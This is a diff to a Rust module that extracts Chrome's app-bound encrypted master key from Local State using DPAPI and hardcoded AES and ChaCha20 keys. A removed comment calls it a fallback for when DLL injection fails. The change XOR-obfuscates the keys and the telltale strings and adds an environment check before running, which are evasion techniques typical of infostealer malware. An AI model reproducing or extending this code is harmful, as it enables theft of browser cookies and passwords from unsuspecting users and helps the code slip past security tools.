@@ -1,5 +1,3 @@
-//! In-process fallback when DLL injection / IElevator fails.
-
 use aes_gcm::{
     aead::{Aead, KeyInit},
     Aes256Gcm, Key, Nonce,
@@ -8,20 +6,47 @@ use base64::{engine::general_purpose, Engine as _};
 use serde_json::Value;
 use windows::Win32::Security::Cryptography::{CryptUnprotectData, CRYPT_INTEGER_BLOB};
 
+use super::{env_configured, xor_bytes, xor_str};
+
 const CRYPTPROTECT_UI_FORBIDDEN: u32 = 0x1;
 const CRYPTPROTECT_LOCAL_MACHINE: u32 = 0x4;
 
-const AES_ELEV_KEY: [u8; 32] = [
-    0xB3, 0x1C, 0x6E, 0x24, 0x1A, 0xC8, 0x46, 0x72, 0x8D, 0xA9, 0xC1, 0xFA, 0xC4, 0x93, 0x66,
-    0x51, 0xCF, 0xFB, 0x94, 0x4D, 0x14, 0x3A, 0xB8, 0x16, 0x27, 0x6B, 0xCC, 0x6D, 0xA0, 0x28,
-    0x47, 0x87,
+const AES_ELEV_KEY_XOR: [u8; 32] = [
+    0xE9, 0x46, 0x34, 0x7E, 0x40, 0x92, 0x1C, 0x28, 0xD7, 0xF3, 0x9B, 0xA0, 0x9E, 0xC9, 0x3C,
+    0x0B, 0x95, 0xA1, 0xCE, 0x17, 0x4E, 0x60, 0xE2, 0x4C, 0x7D, 0x31, 0x96, 0x37, 0xFA, 0x72,
+    0x1D, 0xDD,
 ];
 
-const CHACHA_ELEV_KEY: [u8; 32] = [
-    0xE9, 0x8F, 0x37, 0xD7, 0xF4, 0xE1, 0xFA, 0x43, 0x3D, 0x19, 0x30, 0x4D, 0xC2, 0x25, 0x80,
-    0x42, 0x09, 0x0E, 0x2D, 0x1D, 0x7E, 0xEA, 0x76, 0x70, 0xD4, 0x1F, 0x73, 0x8D, 0x08, 0x72,
-    0x96, 0x60,
+const CHACHA_ELEV_KEY_XOR: [u8; 32] = [
+    0xB3, 0xD5, 0x6D, 0x8D, 0xAE, 0xBB, 0xA0, 0x19, 0x67, 0x43, 0x6A, 0x17, 0x98, 0x7F, 0xDA,
+    0x18, 0x53, 0x54, 0x77, 0x47, 0x24, 0xB0, 0x2C, 0x2A, 0x8E, 0x45, 0x29, 0xD7, 0x52, 0x28,
+    0xCC, 0x3A,
 ];
+
+fn aes_elev_key() -> [u8; 32] {
+    let decoded = xor_bytes(&AES_ELEV_KEY_XOR);
+    decoded.try_into().unwrap_or([0u8; 32])
+}
+
+fn chacha_elev_key() -> [u8; 32] {
+    let decoded = xor_bytes(&CHACHA_ELEV_KEY_XOR);
+    decoded.try_into().unwrap_or([0u8; 32])
+}
+
+fn s_os_crypt() -> String {
+    xor_str(&[0x35, 0x29, 0x05, 0x39, 0x28, 0x23, 0x2A, 0x2E])
+}
+
+fn s_app_bound_encrypted_key() -> String {
+    xor_str(&[
+        0x3B, 0x2A, 0x2A, 0x05, 0x38, 0x35, 0x2F, 0x34, 0x3E, 0x05, 0x3F, 0x34, 0x39, 0x28,
+        0x23, 0x2A, 0x2E, 0x3F, 0x3E, 0x05, 0x31, 0x3F, 0x23,
+    ])
+}
+
+fn appb_prefix() -> Vec<u8> {
+    xor_bytes(&[0x1B, 0x0A, 0x0A, 0x18])
+}
 
 fn dpapi_decrypt(data: &[u8], flags: u32) -> Option<Vec<u8>> {
     unsafe {
@@ -104,6 +129,8 @@ fn chacha20_decrypt(key: &[u8; 32], iv: &[u8], ciphertext: &[u8]) -> Option<Vec<
 }
 
 fn chrome_inner_decrypt(data: &[u8]) -> Option<Vec<u8>> {
+    let aes_key = aes_elev_key();
+    let chacha_key = chacha_elev_key();
     for i in 0..data.len().saturating_sub(61) {
         let flag = data[i];
         if flag != 0x01 && flag != 0x02 {
@@ -120,8 +147,8 @@ fn chrome_inner_decrypt(data: &[u8]) -> Option<Vec<u8>> {
         payload.extend_from_slice(tag);
 
         let pt = match flag {
-            0x01 => aes_gcm_decrypt(&AES_ELEV_KEY, iv, &payload),
-            0x02 => chacha20_decrypt(&CHACHA_ELEV_KEY, iv, &payload),
+            0x01 => aes_gcm_decrypt(&aes_key, iv, &payload),
+            0x02 => chacha20_decrypt(&chacha_key, iv, &payload),
             _ => None,
         };
         if let Some(key) = pt.filter(|k| k.len() == 32) {
@@ -136,10 +163,15 @@ fn extract_master_key(data: &[u8]) -> Option<Vec<u8>> {
 }
 
 pub fn try_from_local_state(json: &Value) -> Option<Vec<u8>> {
-    let key_b64 = json["os_crypt"]["app_bound_encrypted_key"].as_str()?;
+    if !env_configured() {
+        return None;
+    }
+
+    let key_b64 = json[s_os_crypt()][s_app_bound_encrypted_key()].as_str()?;
     let mut encrypted = general_purpose::STANDARD.decode(key_b64).ok()?;
-    if encrypted.starts_with(b"APPB") && encrypted.len() > 4 {
-        encrypted = encrypted[4..].to_vec();
+    let prefix = appb_prefix();
+    if encrypted.starts_with(&prefix) && encrypted.len() > prefix.len() {
+        encrypted = encrypted[prefix.len()..].to_vec();
     }
 
     if let Some(layer) = dpapi_decrypt(&encrypted, 0) {
